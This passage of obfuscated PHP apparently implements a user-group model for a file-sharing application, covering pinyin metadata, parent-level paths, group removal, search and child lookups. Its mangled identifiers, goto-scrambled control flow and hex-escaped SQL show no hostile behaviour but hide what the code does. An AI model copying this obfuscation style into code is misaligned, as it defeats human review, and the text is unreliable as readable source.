$dÇó¹âñÁ… = $this->getInfoSimple($a¹ˆÁòÜ); $F‘¤…çÄ = $dÇó¹âñÁ…[$BÄİ‹›ª’[28]]; } if (!Input::check($F‘¤…çÄ, $BÄİ‹›ª’[554])) { $this->metaSet($a¹ˆÁòÜ, $BÄİ‹›ª’[441], null); $this->metaSet($a¹ˆÁòÜ, $BÄİ‹›ª’[440], null); return; } $B­ªÎè¾©˜ = array($BÄİ‹›ª’[441] => str_replace($BÄİ‹›ª’[50], $BÄİ‹›ª’[33], Pinyin::encode($F‘¤…çÄ)), $BÄİ‹›ª’[440] => Pinyin::encode($F‘¤…çÄ, $BÄİ‹›ª’[555])); $this->metaSet($a¹ˆÁòÜ, $B­ªÎè¾©˜); } protected function groupStatus($Dá‚—éÅ„ç, $aí¶„™š÷°) { goto d¢£ŞğŒÒ; d¢£ŞğŒÒ: $f†»¡å­ =& $_SERVER[¢Í]; $dù‰†Ğ‚ÅŞ = $this->getInfoSimple($Dá‚—éÅ„ç); if (!$dù‰†Ğ‚ÅŞ) { return !1; } goto D¸“§Ö‹÷¢; D¸“§Ö‹÷¢: if ($aí¶„™š÷° == $f†»¡å­[93]) { $f˜ùäôÂ©õ = $this->parentLevelArray($dù‰†Ğ‚ÅŞ[$f†»¡å­[485]]); } else { $fñÉÔÂĞò = array($f†»¡å­[551] => array($f†»¡å­[509], $dù‰†Ğ‚ÅŞ[$f†»¡å­[485]] . $dù‰†Ğ‚ÅŞ[$f†»¡å­[1648]] . $f†»¡å­[510])); $f˜ùäôÂ©õ = $this->where($fñÉÔÂĞò)->field($f†»¡å­[1648])->select(); $f˜ùäôÂ©õ = array_to_keyvalue($f˜ùäôÂ©õ, $f†»¡å­[33], $f†»¡å­[1648]); } $f˜ùäôÂ©õ[] = $dù‰†Ğ‚ÅŞ[$f†»¡å­[1648]]; $Fµ„Ïƒ—‹ = array(); goto EÉ°Ó¾†¢«; EÉ°Ó¾†¢«: foreach ($f˜ùäôÂ©õ as $Dá‚—éÅ„ç) { $Fµ„Ïƒ—‹[] = array($f†»¡å­[1648] => $Dá‚—éÅ„ç, $f†»¡å­[99] => $f†»¡å­[703], $f†»¡å­[375] => $aí¶„™š÷°); } return Model($f†»¡å­[1730])->addAll($Fµ„Ïƒ—‹, array(), !0); goto D‰âæ²š; D‰âæ²š: } protected function groupRemove($c®±––‡À‡) { goto C®ñ†…¸¨ù; Bè¹¼¹Ì: if (!$FÆÊÂÛÄ£ || $FÆÊÂÛÄ£[$C•äËÂë£[487]] == 0) { return !1; } $D°ë‘Ö‚Æ© = $this->getInfoSimple($FÆÊÂÛÄ£[$C•äËÂë£[487]]); $this->_changeChildLevel($FÆÊÂÛÄ£, $D°ë‘Ö‚Æ©, !0); goto b“ÎÓ×Îù; b“ÎÓ×Îù: $this->where(array($C•äËÂë£[487] => $c®±––‡À‡))->save(array($C•äËÂë£[487] => $FÆÊÂÛÄ£[$C•äËÂë£[487]])); Model($C•äËÂë£[1730])->where($aÊ¤™‡íã)->delete(); Model($C•äËÂë£[1731])->where($aÊ¤™‡íã)->delete(); goto B¯ ™ù›Î; C®ñ†…¸¨ù: $C•äËÂë£ =& $_SERVER[¢Í]; $aÊ¤™‡íã = array($C•äËÂë£[1648] => $c®±––‡À‡); $FÆÊÂÛÄ£ = $this->where($aÊ¤™‡íã)->find(); goto Bè¹¼¹Ì; B¯ ™ù›Î: Model($C•äËÂë£[765])->groupRootRemove($c®±––‡À‡); return $this->where($aÊ¤™‡íã)->delete(); goto B«µ–Ç²¹; B«µ–Ç²¹: } protected function groupSort($eÈÚŒÑ¶äÜ) { $aôÌì¦åÏÍ =& $_SERVER[¢Í]; $dÈÒ”¹×¨Æ = array(); foreach ($eÈÚŒÑ¶äÜ as $B‹šä¡Î„ => $dˆé¨²‡¹ä) { $dÈÒ”¹×¨Æ[] = array($aôÌì¦åÏÍ[1648], $dˆé¨²‡¹ä, $aôÌì¦åÏÍ[1671], $B‹šä¡Î„ + 1); } $this->saveAll($dÈÒ”¹×¨Æ); } public function listData() { $d¡•µˆ‘±¬ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($d¡•µˆ‘±¬[$_SERVER[¢Í][370]]); return $d¡•µˆ‘±¬; } private function _makeOrder($BŠ»‡ÏÌÂ = '') { goto bÎ”³†Ë‚; Eæ®‹”óÏ·: $c¶ÔÍ‚Ì‡¦ = Input::get($bõ´Õ‚à—[432], $bõ´Õ‚à—[7], $bõ´Õ‚à—[1652], $dÃõ™¤Ñ÷); $C‡ƒÊøøõ = Input::get($bõ´Õ‚à—[433], $bõ´Õ‚à—[7], $bõ´Õ‚à—[1732], array($bõ´Õ‚à—[1732], $bõ´Õ‚à—[429])); $C‡ƒÊøøõ = $aÉ­¢˜ãßƒ[$C‡ƒÊøøõ]; goto CÛ“òÕÚÜ›; bÎ”³†Ë‚: $bõ´Õ‚à— =& $_SERVER[¢Í]; $dÃõ™¤Ñ÷ = array($bõ´Õ‚à—[1648], $bõ´Õ‚à—[28], $bõ´Õ‚à—[1634], $bõ´Õ‚à—[200]); $aÉ­¢˜ãßƒ = array($bõ´Õ‚à—[427] => $bõ´Õ‚à—[428], $bõ´Õ‚à—[429] => $bõ´Õ‚à—[430]); goto Eæ®‹”óÏ·; CÛ“òÕÚÜ›: $BŠ»‡ÏÌÂ = $BŠ»‡ÏÌÂ . "{$c¶ÔÍ‚Ì‡¦}\x20{$C‡ƒÊøøõ}\x2c\40\147\x72\x6f\x75\160\x49\x44\x20\x61\x73\x63"; return $this->order($BŠ»‡ÏÌÂ); goto eÎ–’ÌøŒÅ; eÎ–’ÌøŒÅ: } public function listChild($BÑƒ«§È¾Ó) { $FåÏÏå××¡ =& $_SERVER[¢Í]; $cò”ø“ù×– = $this->where(array($FåÏÏå××¡[487] => $BÑƒ«§È¾Ó))->_makeOrder()->selectPage(200); $this->_listDataApply($cò”ø“ù×–[$FåÏÏå××¡[370]]); return $cò”ø“ù×–; } public function listByID($aÌĞ¥ªø¡ó) { $eä¿ƒÏÉÌ =& $_SERVER[¢Í]; if (!$aÌĞ¥ªø¡ó) { return array(); } $DİíàÄ«à» = array($eä¿ƒÏÉÌ[1648] => array($eä¿ƒÏÉÌ[7], $aÌĞ¥ªø¡ó)); $E‹èçÆ¼ÀÁ = $this->where($DİíàÄ«à»)->select(); $this->_listDataApply($E‹èçÆ¼ÀÁ); return $E‹èçÆ¼ÀÁ; } public function listSearch($dÄŠñÒ¯) { goto cÓ¬×­˜­; A¶îÚØã†ƒ: $BÖĞî”µ = $BÖĞî”µ ? $BÖĞî”µ : array(); if (!$BÖĞî”µ || count($BÖĞî”µ[$d¡¥’ÖØÉô[370]]) < 5 && Input::check($EŒÀ¢£Ü‚Ú, $d¡¥’ÖØÉô[321])) { goto cÆØ°ÜÁÅ–; f¦äò–æÉ‡: $Dä°®ºÔÖ = array_merge($E¬Ö¹®î›©, $eß¬ô«ÅØ¬, $BÖĞî”µ[$d¡¥’ÖØÉô[370]]); $BÖĞî”µ[$d¡¥’ÖØÉô[370]] = array_unique_by_key($Dä°®ºÔÖ, $d¡¥’ÖØÉô[1648]); $BÖĞî”µ[$d¡¥’ÖØÉô[367]][$d¡¥’ÖØÉô[368]] = count($BÖĞî”µ[$d¡¥’ÖØÉô[370]]); goto AçÛ±Ïˆ¦‹; AçÛ±Ïˆ¦‹: $BÖĞî”µ[$d¡¥’ÖØÉô[367]][$d¡¥’ÖØÉô[369]] = ceil($BÖĞî”µ[$d¡¥’ÖØÉô[367]][$d¡¥’ÖØÉô[368]] / $BÖĞî”µ[$d¡¥’ÖØÉô[367]][$d¡¥’ÖØÉô[365]]); goto F›¼‰÷õ¦Œ; cÆØ°ÜÁÅ–: $f¶×¦è„Ûº = $this->groupChildrenAll($B‹¿˜è…¬¶); $E¬Ö¹®î›© = $this->_searchFromMeta($d¡¥’ÖØÉô[440], $EŒÀ¢£Ü‚Ú, 10, $f¶×¦è„Ûº); $eß¬ô«ÅØ¬ = $this->_searchFromMeta($d¡¥’ÖØÉô[441], $EŒÀ¢£Ü‚Ú, 10, $f¶×¦è„Ûº); goto f¦äò–æÉ‡; F›¼‰÷õ¦Œ: } $this->_listDataApply($BÖĞî”µ[$d¡¥’ÖØÉô[370]]); goto e“Ê£Æµğß; A£ÅŸ‹‚–‹: if ($B‹¿˜è…¬¶) { $Eçµë“ğ = $this->getInfoSimple($B‹¿˜è…¬¶); $dæ¢¼ï‡«¨ = $Eçµë“ğ[$d¡¥’ÖØÉô[485]] . $B‹¿˜è…¬¶ . $d¡¥’ÖØÉô[510]; $a¬–†ÏÎ­î = array($a¬–†ÏÎ­î, array($d¡¥’ÖØÉô[485] => array($d¡¥’ÖØÉô[382], $dæ¢¼ï‡«¨))); } $a¬–†ÏÎ­î = $this->parseWhereLike($a¬–†ÏÎ­î); $BÖĞî”µ = $this->_makeOrder()->where($a¬–†ÏÎ­î)->selectPage(20); goto A¶îÚØã†ƒ; DğõÎÌÕô‹: if (!trim($EŒÀ¢£Ü‚Ú)) { return !1; } $EŒÀ¢£Ü‚Ú = str_replace($d¡¥’ÖØÉô[1735], $d¡¥’ÖØÉô[1736], $EŒÀ¢£Ü‚Ú); $a¬–†ÏÎ­î = array($d¡¥’ÖØÉô[1648] => array($d¡¥’ÖØÉô[382], "{$EŒÀ¢£Ü‚Ú}\x25"), $d¡¥’ÖØÉô[28] => array($d¡¥’ÖØÉô[382], "\x25{$EŒÀ¢£Ü‚Ú}\x25"), $d¡¥’ÖØÉô[925] => $d¡¥’ÖØÉô[1737]); goto A£ÅŸ‹‚–‹; e“Ê£Æµğß: return $BÖĞî”µ; goto aÔï´È„; cÓ¬×­˜­: $d¡¥’ÖØÉô =& $_SERVER[¢Í]; $EŒÀ¢£Ü‚Ú = $dÄŠñÒ¯[$d¡¥’ÖØÉô[1733]]; $B‹¿˜è…¬¶ = isset($dÄŠñÒ¯[$d¡¥’ÖØÉô[1734]]) ? $dÄŠñÒ¯[$d¡¥’ÖØÉô[1734]] : !1; goto DğõÎÌÕô‹; aÔï´È„: } protected function groupChildrenAll($CéÃöÄÂË­) { $D“×£ôŒŒ‹ =& $_SERVER[¢Í]; if (!$CéÃöÄÂË­) { return !1; } if (is_string($CéÃöÄÂË­)) { $CéÃöÄÂË­ = array($CéÃöÄÂË­); } $FİÑ÷¹‰Ÿ’ = $CéÃöÄÂË­; foreach ($CéÃöÄÂË­ as $a¼Ôå‚â‘) { $eø¼÷ªìÌİ = $this->getInfoSimple($a¼Ôå‚â‘); $CäéŒÕÊÊÇ = array($D“×£ôŒŒ‹[485] => array($D“×£ôŒŒ‹[382], $eø¼÷ªìÌİ[$D“×£ôŒŒ‹[485]] . $a¼Ôå‚â‘ . $D“×£ôŒŒ‹[510])); $c‰¨ôİŒ¥ = $this->field($D“×£ôŒŒ‹[1648])->where($CäéŒÕÊÊÇ)->select(); $FİÑ÷¹‰Ÿ’ = array_merge($FİÑ÷¹‰Ÿ’, array_to_keyvalue($c‰¨ôİŒ¥, $D“×£ôŒŒ‹[33], $D“×£ôŒŒ‹[1648])); } return array_unique($FİÑ÷¹‰Ÿ’); } private function _searchFromMeta($aŞŒ´õ»ãö, $EÖ†ÅëÀî, $EŒíÀá· ®, $D³Üº‚‹ì) { goto cÅºÍ‹ßó‹; e ¾è±œ‰Æ: $cå’ùîè = $this->parseWhereLike($cå’ùîè); if ($D³Üº‚‹ì) { $cå’ùîè[$DÖÜ¨½Í±Ö[1648]] = array($DÖÜ¨½Í±Ö[7], $D³Üº‚‹ì); } $dƒåé†àĞ = Model($DÖÜ¨½Í±Ö[1738])->where($cå’ùîè)->limit($EŒíÀá· ®)->select(); goto D»»„‚ë¤î; D»»„‚ë¤î: if (!$dƒåé†àĞ) { return array(); } $dƒåé†àĞ = array_to_keyvalue($dƒåé†àĞ, $DÖÜ¨½Í±Ö[33], $DÖÜ¨½Í±Ö[1648]); $b‡º‚óÒµõ = $this->where(array($DÖÜ¨½Í±Ö[1729] => array($DÖÜ¨½Í±Ö[7], $dƒåé†àĞ)))->select(); goto E·‘‚×·—¯; E·‘‚×·—¯: if (!$b‡º‚óÒµõ) { return array(); } return $b‡º‚óÒµõ; goto DĞ«ØÓØî; cÅºÍ‹ßó‹: $DÖÜ¨½Í±Ö =& $_SERVER[¢Í]; $EÖ†ÅëÀî = strtolower($EÖ†ÅëÀî); $cå’ùîè = array($DÖÜ¨½Í±Ö[99] => $aŞŒ´õ»ãö, $DÖÜ¨½Í±Ö[375] => array($DÖÜ¨½Í±Ö[382], "\45{$EÖ†ÅëÀî}\x25")); goto e ¾è±œ‰Æ; DĞ«ØÓØî: } protected function _listDataApplyItem($BÈÑĞòÈ°í) { $B‹ÀË³²Âó = array($BÈÑĞòÈ°í); $this->_listDataApply($B‹ÀË³²Âó); return $B‹ÀË³²Âó[0]; } protected function _listDataApply(&$CôÀ°¾´™á) { goto d§¦°ë¬æİ; d§¦°ë¬æİ: $Cİ¹×­òåŠ =& $_SERVER[¢Í]; if (!$CôÀ°¾´™á) { return; } $FœÖ¤áî’† = array_to_keyvalue($CôÀ°¾´™á, $Cİ¹×­òåŠ[33], $Cİ¹×­òåŠ[1648]); goto F´ÜŠ¯ÈÜÈ; AŸ‚Î©Ö¤: $this->_listAppendParent($CôÀ°¾´™á); $this->_listAppendSourceRoot($CôÀ°¾´™á, $FœÖ¤áî’†); goto f ©Ä‹İÜ—; F´ÜŠ¯ÈÜÈ: $this->_listAppendChildren($CôÀ°¾´™á); $this->_listAppendChildrenMember($CôÀ°¾´™á); $this->_listAppendMeta($CôÀ°¾´™á, $FœÖ¤áî’†); goto AŸ‚Î©Ö¤; f ©Ä‹İÜ—: } private function _listAppendChildren(&$CÛã²Üœá©) { goto C…äÚ‹ˆÁò; fÙù…Ê±÷©: $F–ÅÊòËË = array_to_keyvalue($F–ÅÊòËË, $B÷®È“ªˆ[476]); foreach ($CÛã²Üœá© as &$dÒ´¶àª›¢) { $dÒ´¶àª›¢[$B÷®È“ªˆ[1739]] = isset($F–ÅÊòËË[$dÒ´¶àª›¢[$B÷®È“ªˆ[1648]] . $B÷®È“ªˆ[1740]]); } unset($dÒ´¶àª›¢); goto b­”¶ŠÍâà; C…äÚ‹ˆÁò: $B÷®È“ªˆ =& $_SERVER[¢Í]; $A÷¬ªñª–‚ = $B÷®È“ªˆ[377]; $F–ÅÊòËË = array(); goto BÊ‡ñ¹³; BÊ‡ñ¹³: $b–ÈŸ“©íĞ = count($CÛã²Üœá©); $d‰£Ê¸›©Ò = $this->tablePrefix . $this->tableName; for ($f®©¤Ë¿ ¹ = 0, $Fª¡‡âê = 0; $f®©¤Ë¿ ¹ < $b–ÈŸ“©íĞ; $f®©¤Ë¿ ¹++) { $Fª¡‡âê++; $eù–ëÇ‘ù¥ = $CÛã²Üœá©[$f®©¤Ë¿ ¹][$B÷®È“ªˆ[1648]]; $A÷¬ªñª–‚ .= "\123\105\x4c\105\x43\124\x20\x2a\x20\x46\x52\x4f\115\40\50\123\105\114\105\103\x54\x20\x27{$eù–ëÇ‘ù¥}\x5f\143\x68\151\x6c\144\x27\40\x61\163\x20\x68\x61\x73\x20\106\122\x4f\115\40\140{$d‰£Ê¸›©Ò}\x60\40\x77\x68\145\x72\x65\x20\160\141\x72\145\156\x74\111\x44\75{$eù–ëÇ‘ù¥}\40\x6c\x69\x6d\x69\164\40\x31\51\x20\x61\x73\x20\164\142\x5f{$eù–ëÇ‘ù¥}\40\x75\156\151\x6f\x6e\x20\x61\154\154\x20"; if (($Fª¡‡âê >= 20 || $f®©¤Ë¿ ¹ == $b–ÈŸ“©íĞ - 1) && $A÷¬ªñª–‚) { $A÷¬ªñª–‚ = substr($A÷¬ªñª–‚, 0, -strlen($B÷®È“ªˆ[475])); $bËµ›ØÙÙĞ = $this->query($A÷¬ªñª–‚); $F–ÅÊòËË = array_merge($F–ÅÊòËË, $bËµ›ØÙÙĞ); $Fª¡‡âê = 0; $A÷¬ªñª–‚ = $B÷®È“ªˆ[33]; } } goto fÙù…Ê±÷©; b­”¶ŠÍâà: } private function _listAppendChildrenMember(&$Eà›®Äí¦²) { goto d©´Â›°–ˆ; b¦Ìğµ·: $D×îô­Æ¡¸ = array_to_keyvalue($D×îô­Æ¡¸, $c…¿­ƒØ„[476]); foreach ($Eà›®Äí¦² as &$FõÛç–ÇàÊ) { $FõÛç–ÇàÊ[$c…¿­ƒØ„[1741]] = isset($D×îô­Æ¡¸[$FõÛç–ÇàÊ[$c…¿­ƒØ„[1648]] . $c…¿­ƒØ„[1740]]); } unset($FõÛç–ÇàÊ); goto EÊø®‘²î—; d©´Â›°–ˆ: $c…¿­ƒØ„ =& $_SERVER[¢Í]; $D§„ùô¹„ = $c…¿­ƒØ„[377]; $D×îô­Æ¡¸ = array(); goto bŸØïã¡; bŸØïã¡: $F«ÍÉÊ…·´ = count($Eà›®Äí¦²); $f‡”‚„ï¡‰ = $this->tablePrefix . $c…¿­ƒØ„[1731]; for ($B«®„ãğè¬ = 0, $FÊÎõŞ¡êÓ = 0; $B«®„ãğè¬ < $F«ÍÉÊ…·´; $B«®„ãğè¬++) { $FÊÎõŞ¡êÓ++; $c†•¦–Öâœ = $Eà›®Äí¦²[$B«®„ãğè¬][$c…¿­ƒØ„[1648]]; $D§„ùô¹„ .= "\x53\x45\x4c\x45\x43\124\x20\52\x20\x46\122\x4f\115\x20\50\123\105\114\x45\x43\x54\x20\47{$c†•¦–Öâœ}\x5f\143\x68\x69\x6c\x64\47\x20\141\163\x20\x68\x61\x73\x20\x46\122\117\115\x20\140{$f‡”‚„ï¡‰}\x60\40\x77\x68\145\x72\x65\40\147\x72\x6f\165\x70\111\104\75{$c†•¦–Öâœ}\x20\154\151\x6d\x69\x74\40\61\x29\40\x61\x73\40\164\x62\137{$c†•¦–Öâœ}\x20\x75\x6e\x69\x6f\156\40\141\154\x6c\40"; if (($FÊÎõŞ¡êÓ >= 20 || $B«®„ãğè¬ == $F«ÍÉÊ…·´ - 1) && $D§„ùô¹„) { $D§„ùô¹„ = substr($D§„ùô¹„, 0, -strlen($c…¿­ƒØ„[475])); $f—ÙÌ‹“ = $this->query($D§„ùô¹„); $D×îô­Æ¡¸ = array_merge($D×îô­Æ¡¸, $f—ÙÌ‹“); $FÊÎõŞ¡êÓ = 0; $D§„ùô¹„ = $c…¿­ƒØ„[33]; } } goto b¦Ìğµ·; EÊø®‘²î—: } private function _listAppendMeta(&$cƒ«§¡ô, $CÜÒÓ‡„³½) { goto c ù»ƒå‚£; B×ŠÙçßÔ: $Ağ™‰‚á = array_to_keyvalue_group($Ağ™‰‚á, $e»é†’Ìª[1648]); foreach ($Ağ™‰‚á as &$CÃÅ‡Ì²) { $CÃÅ‡Ì² = array_to_keyvalue($CÃÅ‡Ì², $e»é†’Ìª[99], $e»é†’Ìª[375]); } unset($CÃÅ‡Ì²); goto a£‰Ã …‡; c ù»ƒå‚£: $e»é†’Ìª =& $_SERVER[¢Í]; $dîÔ°ÒØŒë = array($e»é†’Ìª[1648] => array($e»é†’Ìª[7], $CÜÒÓ‡„³½)); $Ağ™‰‚á = Model($e»é†’Ìª[1730])->where($dîÔ°ÒØŒë)->select(); goto B×ŠÙçßÔ; a£‰Ã …‡: foreach ($cƒ«§¡ô as &$cÜà¼Øí—ğ) { $cÜà¼Øí—ğ[$e»é†’Ìª[442]] = array(); if (isset($Ağ™‰‚á[$cÜà¼Øí—ğ[$e»é†’Ìª[1648]]])) { $cÜà¼Øí—ğ[$e»é†’Ìª[442]] = $Ağ™‰‚á[$cÜà¼Øí—ğ[$e»é†’Ìª[1648]]]; } } unset($cÜà¼Øí—ğ); goto dØ›áŞÆº; dØ›áŞÆº: } protected function parentLevelArray($fùËÉÆØ¬) { $bôîå—‡…ß =& $_SERVER[¢Í]; $fùËÉÆØ¬ = explode($bôîå—‡…ß[47], trim($fùËÉÆØ¬, $bôîå—‡…ß[47])); $fùËÉÆØ¬ = array_remove_value($fùËÉÆØ¬, $bôîå—‡…ß[494]); return $fùËÉÆØ¬; } private function _listAppendParent(&$Bëù×åƒ›¨) { goto E¾ø‰Û„æÊ; Eµö¯½æ¡: if ($aˆÔÃ‚±) { $F‰ô¿‘é‘¾ = array($a–Ëµ¶ª‹±[1729] => array($a–Ëµ¶ª‹±[409], $aˆÔÃ‚±)); $Fà°ƒ¬‚ªÓ = $this->field($a–Ëµ¶ª‹±[1742])->where($F‰ô¿‘é‘¾)->select(); $cÎå‡¤âòŠ = array_to_keyvalue($Fà°ƒ¬‚ªÓ, $a–Ëµ¶ª‹±[1648], $a–Ëµ¶ª‹±[28]); $d•®İŒ÷Á = array_merge_index($d•®İŒ÷Á, $cÎå‡¤âòŠ); } $CïÅò¨ãÈ‰ = $GLOBALS[$a–Ëµ¶ª‹±[6]][$a–Ëµ¶ª‹±[94]][$a–Ëµ¶ª‹±[1743]]; foreach ($Bëù×åƒ›¨ as &$e‚ë«İŸÎŞ) { $b¢øõ©†–  = $this->parentLevelArray($e‚ë«İŸÎŞ[$a–Ëµ¶ª‹±[485]]); $A‰¯·¡¡Ú¨ = $a–Ëµ¶ª‹±[33]; foreach ($b¢øõ©†–  as $BŞÑÉâ¾‚É => $AäØ’‚ôÓ¦) { if ($CïÅò¨ãÈ‰ && $BŞÑÉâ¾‚É == 0) { continue; } $A‰¯·¡¡Ú¨ .= $d•®İŒ÷Á[$AäØ’‚ôÓ¦] . $a–Ëµ¶ª‹±[8]; } if ($b¢øõ©†– ) { $A‰¯·¡¡Ú¨ .= $e‚ë«İŸÎŞ[$a–Ëµ¶ª‹±[28]]; } $e‚ë«İŸÎŞ[$a–Ëµ¶ª‹±[489]] = str_replace($a–Ëµ¶ª‹±[493], $a–Ëµ¶ª‹±[8], $A‰¯·¡¡Ú¨); } goto FÆ´×çÄœ; FÆ´×çÄœ: unset($e‚ë«İŸÎŞ); goto F„õ”ï…äİ; E¾ø‰Û„æÊ: $a–Ëµ¶ª‹± =& $_SERVER[¢Í]; $d•®İŒ÷Á = array(); foreach ($Bëù×åƒ›¨ as &$e‚ë«İŸÎŞ) { $d•®İŒ÷Á[$e‚ë«İŸÎŞ[$a–Ëµ¶ª‹±[1648]]] = $e‚ë«İŸÎŞ[$a–Ëµ¶ª‹±[28]]; $b¢øõ©†–  = $this->parentLevelArray($e‚ë«İŸÎŞ[$a–Ëµ¶ª‹±[485]]); foreach ($b¢øõ©†–  as $AäØ’‚ôÓ¦) { if (!isset($d•®İŒ÷Á[$AäØ’‚ôÓ¦])) { $d•®İŒ÷Á[$AäØ’‚ôÓ¦] = 0; } } } goto dƒºÇËÆàØ; dƒºÇËÆàØ: unset($e‚ë«İŸÎŞ); $aˆÔÃ‚± = array(); foreach ($d•®İŒ÷Á as $BŞÑÉâ¾‚É => $Dâ‚×ßÂÍÔ) { if (!$Dâ‚×ßÂÍÔ) { $aˆÔÃ‚±[] = $BŞÑÉâ¾‚É; } } goto Eµö¯½æ¡; F„õ”ï…äİ: } private function _listAppendSourceRoot(&$eç¿ÚÇ©Ê, $D†õ“—àÏ¤) { goto BËæøÛ¹õ; côœŠÒ: $AÁèˆ½¼¡š = Model($B…‰è‚§‡î[765])->order($B…‰è‚§‡î[1745])->field($C–…É­«ŸŠ)->where($E’ÑìÅ¶Ü‰)->select(); $AÁèˆ½¼¡š = array_to_keyvalue($AÁèˆ½¼¡š, $B…‰è‚§‡î[482]); $AÁèˆ½¼¡š = array_remove_key($AÁèˆ½¼¡š, $B…‰è‚§‡î[482]); goto B×´ø¢å¼°; B×´ø¢å¼°: foreach ($eç¿ÚÇ©Ê as &$bÙ»—¤è‰Ò) { $bÙ»—¤è‰Ò[$B…‰è‚§‡î[416]] = $AÁèˆ½¼¡š[$bÙ»—¤è‰Ò[$B…‰è‚§‡î[1648]]] ? $AÁèˆ½¼¡š[$bÙ»—¤è‰Ò[$B…‰è‚§‡î[1648]]] : array(); } unset($bÙ»—¤è‰Ò); goto CŒ»øâ³; BËæøÛ¹õ: $B…‰è‚§‡î =& $_SERVER[¢Í]; $E’ÑìÅ¶Ü‰ = array($B…‰è‚§‡î[396] => SourceModel::TYPE_GROUP, $B…‰è‚§‡î[487] => 0, $B…‰è‚§‡î[482] => array($B…‰è‚§‡î[7], $D†õ“—àÏ¤)); $C–…É­«ŸŠ = $B…‰è‚§‡î[1744]; goto côœŠÒ; CŒ»øâ³: } protected function groupMerge($dÕÌ‹É»³†) { $dÕÌ‹É»³† = array_values(array_unique($dÕÌ‹É»³†)); $AÅóÓ“é¯… = array(); for ($a‹ŞÓêÛ¸ = 0; $a‹ŞÓêÛ¸ < count($dÕÌ‹É»³†); $a‹ŞÓêÛ¸++) { $c…ª”†š‹› = !1; for ($BŠ…º¹ì„é = 0; $BŠ…º¹ì„é < count($dÕÌ‹É»³†); $BŠ…º¹ì„é++) { if ($a‹ŞÓêÛ¸ == $BŠ…º¹ì„é) { continue; } if ($this->isParentOf($dÕÌ‹É»³†[$BŠ…º¹ì„é], $dÕÌ‹É»³†[$a‹ŞÓêÛ¸])) { $c…ª”†š‹› = !0; break; } } if (!$c…ª”†š‹›) { $AÅóÓ“é¯…[] = $dÕÌ‹É»³†[$a‹ŞÓêÛ¸]; } } return $AÅóÓ“é¯…; } protected function isParentOf($DŠÏ‹Š˜•Å, $C»İ³†ÔõÎ) { goto BÖøˆ­î·; Dé•Şô–ÚÊ: return !1; goto DâÏÚª²§; F ´È¦ãÕƒ: $fÁ‰Üáèº¢ = $this->getInfoSimple($C»İ³†ÔõÎ); $b¼öÏšîùğ = $C‡Õ —…œ×[$C©İªëç‚¦[485]] . $DŠÏ‹Š˜•Å . $C©İªëç‚¦[47]; if (substr($fÁ‰Üáèº¢[$C©İªëç‚¦[485]], 0, strlen($b¼öÏšîùğ)) == $b¼öÏšîùğ) { return !0; } goto Dé•Şô–ÚÊ; BÖøˆ­î·: $C©İªëç‚¦ =& $_SERVER[¢Í]; if (!$DŠÏ‹Š˜•Å || !$C»İ³†ÔõÎ || $DŠÏ‹Š˜•Å == $C»İ³†ÔõÎ) { return !1; } $C‡Õ —…œ× = $this->getInfoSimple($DŠÏ‹Š˜•Å); goto F ´È¦ãÕƒ; DâÏÚª²§: } public function groupShowRoot($e™ò¯”¡‡–, $fªËª§–«Ç = false) { goto F¸â­ñ¦ÅÅ; eÍ¡¯Áòé: if ($fªËª§–«Ç && count($F¬¡ñˆ¾í) == 1) { return $a§‰é›‰†; } if (!$aÂÌ•Ùò´ö[$c°‘·¨®ˆÙ[442]] || !isset($aÂÌ•Ùò´ö[$c°‘·¨®ˆÙ[442]][$c°‘·¨®ˆÙ[1727]]) || $aÂÌ•Ùò´ö[$c°‘·¨®ˆÙ[442]][$c°‘·¨®ˆÙ[1727]] == $c°‘·¨®ˆÙ[1700]) { return $this->groupShowRoot($F¬¡ñˆ¾í[count($F¬¡ñˆ¾í) - 1], $fªËª§–«Ç); } if ($aÂÌ•Ùò´ö[$c°‘·¨®ˆÙ[442]][$c°‘·¨®ˆÙ[1727]] == $c°‘·¨®ˆÙ[362]) { $Dó‹ßÄÏŸ„ = explode($c°‘·¨®ˆÙ[47], $aÂÌ•Ùò´ö[$c°‘·¨®ˆÙ[442]][$c°‘·¨®ˆÙ[1728]]); if ($Dó‹ßÄÏŸ„) { $a§‰é›‰† = array_merge($a§‰é›‰†, $Dó‹ßÄÏŸ„); } } goto FËğŠ¡¨–®; F¸â­ñ¦ÅÅ: $c°‘·¨®ˆÙ =& $_SERVER[¢Í]; $aÂÌ•Ùò´ö = $this->getInfo($e™ò¯”¡‡–); if (!$aÂÌ•Ùò´ö) { return array(); } goto C¶¹¡¸Êº; FËğŠ¡¨–®: return $a§‰é›‰†; goto e¦õ­İÏ; C¶¹¡¸Êº: $F¬¡ñˆ¾í = $this->parentLevelArray($aÂÌ•Ùò´ö[$c°‘·¨®ˆÙ[485]]); $a§‰é›‰† = array($e™ò¯”¡‡–); if (count($F¬¡ñˆ¾í) == 0) { return $a§‰é›‰†; } goto eÍ¡¯Áòé; e¦õ­İÏ: } protected function resetParentLevel() { $bÂ¹Ôô¥Üï =& $_SERVER[¢Í]; $Cì±ºî§ğ˜ = $bÂ¹Ôô¥Üï[1648]; $DãğÖ«¹ÏÕ = $this->select(); $DãğÖ«¹ÏÕ = array_to_keyvalue($DãğÖ«¹ÏÕ, $Cì±ºî§ğ˜); foreach ($DãğÖ«¹ÏÕ as $A‹Ü¬ò–êİ) { goto eçŠÏÚ¤¥¶; Fîœ¬îøÆÕ: $eËÚç‹Â¿œ[] = 0; $eËÚç‹Â¿œ = $bÂ¹Ôô¥Üï[47] . implode($bÂ¹Ôô¥Üï[47], array_reverse($eËÚç‹Â¿œ)) . $bÂ¹Ôô¥Üï[47]; $this->setNamePinyin($A‹Ü¬ò–êİ[$Cì±ºî§ğ˜], $A‹Ü¬ò–êİ[$bÂ¹Ôô¥Üï[28]]); goto bœÆ†Ö‹öğ; eçŠÏÚ¤¥¶: $fáÕºïÏµâ = $A‹Ü¬ò–êİ; $eËÚç‹Â¿œ = array(); while ($fáÕºïÏµâ[$bÂ¹Ôô¥Üï[487]] != 0) { $eËÚç‹Â¿œ[] = $fáÕºïÏµâ[$bÂ¹Ôô¥Üï[487]]; $fáÕºïÏµâ = $DãğÖ«¹ÏÕ[$fáÕºïÏµâ[$bÂ¹Ôô¥Üï[487]]]; } goto Fîœ¬îøÆÕ; bœÆ†Ö‹öğ: $this->where(array($Cì±ºî§ğ˜ => $A‹Ü¬ò–êİ[$Cì±ºî§ğ˜]))->save(array($bÂ¹Ôô¥Üï[551] => $eËÚç‹Â¿œ)); goto cƒîÊˆ¼ª—; cƒîÊˆ¼ª—: } return $DãğÖ«¹ÏÕ; } public function 